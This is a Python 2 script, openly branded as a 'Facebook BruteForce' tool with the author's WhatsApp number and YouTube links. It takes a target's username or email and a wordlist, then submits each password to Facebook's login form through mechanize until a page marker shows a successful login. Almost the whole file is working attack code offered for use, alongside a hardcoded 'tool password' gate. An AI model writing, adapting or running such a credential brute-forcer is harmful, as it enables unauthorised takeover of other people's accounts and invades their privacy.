#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    Facebook BruteForce, by Technical James         #
        #    Youtube:    Technical  James Bangla zone   #
        #   Whtsapp Num      +96598064347                             #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)


time.sleep(0.5)
user = raw_input('[๐] Target Username/ID/Email >>?? ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[๐] Wordlist Type James.txt >> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
#Dev:James_Hacker 
##### LOGO #####
logo = """
       \033[1;97m:โโโโโโโโโโโโโโโโโโโโโโโโโโโโโ:
      \033[1;93mโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ::     
     \033[1;95m:โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ:::      
    \033[1;94m::โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ::::      
   \033[1;96m:::โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ:::::         
  \033[1;96m::โงโงโงโงโงโงโงโงโงโง\033[1;91mWhatsapp\033[1;96mโงโงโงโงโงโงโงโงโงโงโโโโโโโ::::        
  \033[1;91m:ใใใ\033[1;93m++96598064347\033[1;91mใใใโโโโโโโโโโโ:::::
\033[1;95mโกโญโโโโโโโโโโโขโโขโโโโโโโโโโโฎโก\033[1;96m-TechnicalJamesBangla-\033[1;95mโกโญโโโโโโโโโโโขโโขโโโโโโโโโโโฎโก
\033[1;92m..............................JamesHacker......................
\033[1;97mโโ โโโโโฆโฆโฆโโ โโโโฆโโฆโฆโ
\033[1;97mโโ โโโฃโโโโโฉโฃ โโโโฃโโโโ   Bangladesh 
\033[1;97mโโ โโโฉโโฉโโฉโโโ โโโโโฉโโ 
\033[1;93mโกโฐโโโโโโโโโโโขโโขโโโโโโโโโโโฏโก\033[1;96mJamesHacker\033[1;95mโกโฐโโโโโโโโโโโขโโขโโโโโโโโโโโฏโก"""
print " \x1b[1;93m=Whtsapp Num +96598064347="
CorrectUsername = "Bangladesh"
CorrectPassword = "TechnicalJames"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCUOqxjU4f9npLso-10Fuw')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/CJSOqxjU4f9npLso-10Fuw')
def login():
	os.system('clear')
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
